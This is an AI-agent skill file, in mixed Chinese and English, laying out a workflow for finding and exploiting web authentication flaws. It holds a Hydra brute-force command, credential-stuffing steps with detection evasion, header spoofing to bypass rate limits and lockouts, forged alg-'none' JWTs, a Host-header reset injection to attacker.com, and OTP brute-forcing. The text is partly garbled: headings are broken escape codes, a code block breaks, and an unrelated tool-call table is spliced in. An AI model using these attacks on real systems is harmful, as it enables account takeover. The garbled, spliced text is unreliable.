---
name: 识别和利用 Web 应用中的认证漏洞
description: "识别和利用 Web 应用中的认证漏洞——会话管理、JWT 攻击、OAuth 滥用和暴力破解防御绕过。"
risk: unknown
source: community
author: zebbern
date_added: "2026-02-27"
---

# /u8ba4/u8bc1/u7f3a/u9677 Testing

## 目的

Identify and exploit authentication and 会话 management vulnerabilities in web applications. Broken authentication consistently ranks in the OWASP Top 10 and can lead to account takeover, identity theft, and unauthorized access to sensitive systems. This skill covers testing methodologies for password policies, 会话 handling, multi-factor authentication, and credential management.

## 前提条件

### 必需 Knowledge
- HTTP protocol and 会话 mechanisms
- Authentication types (SFA, 2FA, MFA)
- Cookie and 令牌 handling
- Common authentication frameworks

### 必需 Tools
- Burp Suite Professional or Community
- Hydra or similar brute-force tools
- Custom wordlists for credential testing
- Browser developer tools

### 必需 Access
- Target application URL
- Test account credentials
- Written authorization for testing

## Outputs and Deliverables

1. **Authentication Assessment Report** - Document all identified vulnerabilities
2. **Credential Testing Results** - Brute-force and dictionary attack outcomes
3. **会话 安全性 Analysis** - 令牌 randomness and timeout evaluation
4. **Remediation Recommendations** - 安全性 hardening guidance

## 核心工作流

### Phase 1: Authentication Mechanism Analysis

Understand the application's authentication architecture:

```
# Identify authentication type
- Password-based (forms, basic auth, digest)
- 令牌-based (JWT, OAuth, API keys)
- Certificate-based (mutual TLS)
- Multi-factor (SMS, TOTP, hardware tokens)

# Map authentication endpoints
/login, /signin, /authenticate
/register, /signup
/forgot-password, /reset-password
/logout, /signout
/api/auth/*, /oauth/*
```

Capture and analyze authentication requests:

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test123
```

### Phase 2: Password Policy Testing

Evaluate password requirements and enforcement:

```bash
# Test minimum length (a, ab, abcdefgh)
# Test complexity (password, password1, Password1!)
# Test common weak passwords (123456, password, qwerty, admin)
# Test username as password (admin/admin, test/test)
```

Document policy gaps: Minimum length <8, no complexity, common passwords allowed, username as password.

### Phase 3: Credential Enumeration

Test for username enumeration vulnerabilities:

```bash
# Compare responses for valid vs invalid usernames
# Invalid: "Invalid username" vs Valid: "Invalid password"
# Check timing differences, response codes, registration messages
```

# Password reset
"Email sent if account exists" (secure)
"No account with that email" (leaks info)

# API responses
{"error": "user_not_found"}
{"error": "invalid_password"}
```

### Phase 4: Brute Force Testing

Test account lockout and rate limiting:

```bash
# Using Hydra for form-based auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Using Burp Intruder
1. Capture login request
2. Send to Intruder
3. Set payload positions on password field
4. Load wordlist
5. Start attack
6. Analyze response lengths/codes
```

Check for protections:

```bash
# Account lockout
- After how many attempts?
- Duration of lockout?
- Lockout notification?

# Rate limiting
- Requests per minute limit?
- IP-based or account-based?
- Bypass via headers (X-Forwarded-For)?

# CAPTCHA
- After failed attempts?
- Easily bypassable?
```

### Phase 5: Credential Stuffing

Test with known breached credentials:

```bash
# Credential stuffing differs from brute force
# Uses known email:password pairs from breaches

# Using Burp Intruder with Pitchfork attack
1. Set username and password as positions
2. Load email list as payload 1
3. Load password list as payload 2 (matched pairs)
4. Analyze for successful logins

# Detection evasion
- Slow request rate
- Rotate source IPs
- Randomize user agents
- Add delays between attempts
```

### Phase 6: 会话 Management Testing

Analyze 会话 令牌 security:

```bash
# Capture 会话 cookie
Cookie: SESSIONID=abc123def456

# Test 令牌 characteristics
1. Entropy - Is it random enough?
2. Length - Sufficient length (128+ bits)?
3. Predictability - Sequential patterns?
4. Secure flags - HttpOnly, Secure, SameSite?
```

会话 令牌 analysis:

```python
#!/usr/bin/env python3
import requests
import hashlib

# Collect multiple 会话 tokens
tokens = []
for i in range(100):
    response = requests.get("https://target.com/login")
    令牌 = response.cookies.get("SESSIONID")
    tokens.append(令牌)

# Analyze for patterns
# Check for sequential increments
# Calculate entropy
# Look for timestamp components
```

### Phase 7: 会话 Fixation Testing

Test if 会话 is regenerated after authentication:

```bash
# Step 1: Get 会话 before login
GET /login HTTP/1.1
Response: Set-Cookie: SESSIONID=abc123

# Step 2: Login with same 会话
POST /login HTTP/1.1
Cookie: SESSIONID=abc123
username=valid&password=valid

# Step 3: Check if 会话 changed
# VULNERABLE if SESSIONID remains abc123
# SECURE if new 会话 assigned after login
```

Attack scenario:

```bash
# Attacker 工作流:
1. Attacker visits site, gets 会话: SESSIONID=attacker_session
2. Attacker sends link to victim with fixed 会话:
   https://target.com/login?SESSIONID=attacker_session
3. Victim logs in with attacker's 会话
4. Attacker now has authenticated 会话
```

### Phase 8: 会话 Timeout Testing

Verify 会话 expiration policies:

```bash
# Test idle timeout
1. Login and note 会话 cookie
2. Wait without activity (15, 30, 60 minutes)
3. Attempt to use 会话
4. Check if 会话 is still valid

# Test absolute timeout
1. Login and continuously use 会话
2. Check if forced logout after set period (8 hours, 24 hours)

# Test logout functionality
1. Login and note 会话
2. Click logout
3. Attempt to reuse old 会话 cookie
4. 会话 should be invalidated server-side
```

### Phase 9: Multi-Factor Authentication Testing

Assess MFA implementation security:

```bash
# OTP brute force
- 4-digit OTP = 10,000 combinations
- 6-digit OTP = 1,000,000 combinations
- Test rate limiting on OTP 端点

# OTP bypass techniques
- Skip MFA step by direct URL access
- Modify response to indicate MFA passed
- Null/empty OTP submission
- Previous valid OTP reuse

# API Version Downgrade Attack (crAPI example)
# If /api/v3/check-otp has rate limiting, try older versions:
POST /api/v2/check-otp
{"otp": "1234"}
# Older API versions may lack security controls

# Using Burp for OTP testing
1. Capture OTP verification request
2. Send to Intruder
3. Set OTP field as payload position
4. Use numbers payload (0000-9999)
5. Check for successful bypass
```

Test MFA enrollment:

```bash
# Forced enrollment
- Can MFA be skipped during setup?
- Can backup codes be accessed without verification?

# Recovery process
- Can MFA be disabled via email alone?
- Social engineering potential?
```

### Phase 10: Password Reset Testing

Analyze password reset security:

```bash
# 令牌 security
1. Request password reset
2. Capture reset link
3. Analyze 令牌:
   - Length and randomness
   - Expiration time
   - Single-use enforcement
   - Account binding

# 令牌 manipulation
https://target.com/reset?令牌=abc123&user=victim
# Try changing user parameter while using valid 令牌

# Host header injection
POST /forgot-password HTTP/1.1
Host: attacker.com
email=victim@email.com
# Reset email may contain attacker's domain
```

## 快速参考

| 操作 | 方法 |
|---|---|
| 发现工具 | 调用 `RUBE_SEARCH_TOOLS` |
| 检查连接 | 调用 `RUBE_MANAGE_CONNECTIONS` |
| 执行工具 | 调用 `RUBE_MULTI_EXECUTE_TOOL` |
| 处理分页 | 检查响应中的 `cursor` 字段 |
| 错误处理 | 验证连接状态和schema合规性 |

### Common Vulnerability Types

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Weak passwords | High | Policy testing, dictionary attack |
| No lockout | High | Brute force testing |
| Username enumeration | Medium | Differential response analysis |
| 会话 fixation | High | Pre/post-login 会话 comparison |
| Weak 会话 tokens | High | Entropy analysis |
| No 会话 timeout | Medium | Long-duration 会话 testing |
| Insecure password reset | High | 令牌 analysis, 工作流 bypass |
| MFA bypass | Critical | Direct access, response manipulation |

### Credential Testing Payloads

```bash
# 默认 credentials
admin:admin
admin:password
admin:123456
root:root
test:test
user:user

# Common passwords
123456
password
12345678
qwerty
abc123
password1
admin123

# Breached credential databases
- Have I Been Pwned dataset
- SecLists passwords
- Custom targeted lists
```

### 会话 Cookie Flags

| Flag | Purpose | Vulnerability if Missing |
|------|---------|------------------------|
| HttpOnly | Prevent JS access | XSS can steal 会话 |
| Secure | HTTPS only | Sent over HTTP |
| SameSite | CSRF protection | Cross-site requests allowed |
| Path | URL scope | Broader exposure |
| Domain | Domain scope | Subdomain access |
| Expires | Lifetime | Persistent sessions |

### Rate Limiting Bypass Headers

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Avoid testing with real breached credentials
- Do not access actual user accounts
- Document all testing activities

### Technical Limitations
- CAPTCHA may prevent automated testing
- Rate limiting affects brute force timing
- MFA significantly increases attack difficulty
- Some vulnerabilities require victim interaction

### Scope Considerations
- Test accounts may behave differently than production
- Some features may be disabled in test environments
- Third-party authentication may be out of scope
- Production testing requires extra caution

## 示例

### Example 1: Account Lockout Bypass

**Scenario:** Test if account lockout can be bypassed

```bash
# Step 1: Identify lockout threshold
# Try 5 wrong passwords for admin account
# Result: "Account locked for 30 minutes"

# Step 2: Test bypass via IP rotation
# Use X-Forwarded-For header
POST /login HTTP/1.1
X-Forwarded-For: 192.168.1.1
username=admin&password=attempt1

# Increment IP for each attempt
X-Forwarded-For: 192.168.1.2
# Continue until successful or confirmed blocked

# Step 3: Test bypass via case manipulation
username=Admin (vs admin)
username=ADMIN
# Some systems treat these as different accounts
```

### Example 2: JWT 令牌 Attack

**Scenario:** Exploit weak JWT implementation

```bash
# Step 1: Capture JWT 令牌
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature

# Step 2: Decode and analyze
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"user":"test","role":"user"}

# Step 3: Try "none" algorithm attack
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

# Step 4: Submit modified 令牌
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### Example 3: Password Reset 令牌 Exploitation

**Scenario:** Test password reset functionality

```bash
# Step 1: Request reset for test account
POST /forgot-password
email=test@example.com

# Step 2: Capture reset link
https://target.com/reset?令牌=a1b2c3d4e5f6

# Step 3: Test 令牌 properties
# Reuse: Try using same 令牌 twice
# Expiration: Wait 24+ hours and retry
# Modification: Change characters in 令牌

# Step 4: Test for user parameter manipulation
https://target.com/reset?令牌=a1b2c3d4e5f6&email=admin@example.com
# Check if admin's password can be reset with test user's 令牌
```

## 故障排除

| Issue | Solutions |
|-------|-----------|
| Brute force too slow | Identify rate limit scope; IP rotation; add delays; use targeted wordlists |
| 会话 analysis inconclusive | Collect 1000+ tokens; use statistical tools; check for timestamps; compare accounts |
| MFA cannot be bypassed | Document as secure; test backup/recovery mechanisms; check MFA fatigue; verify enrollment |
| Account lockout prevents testing | Request multiple test accounts; test threshold first; use slower timing |

## /u4f55/u65f6/u4f7f/u7528
This skill is applicable to execute the 工作流 or actions described in the overview.
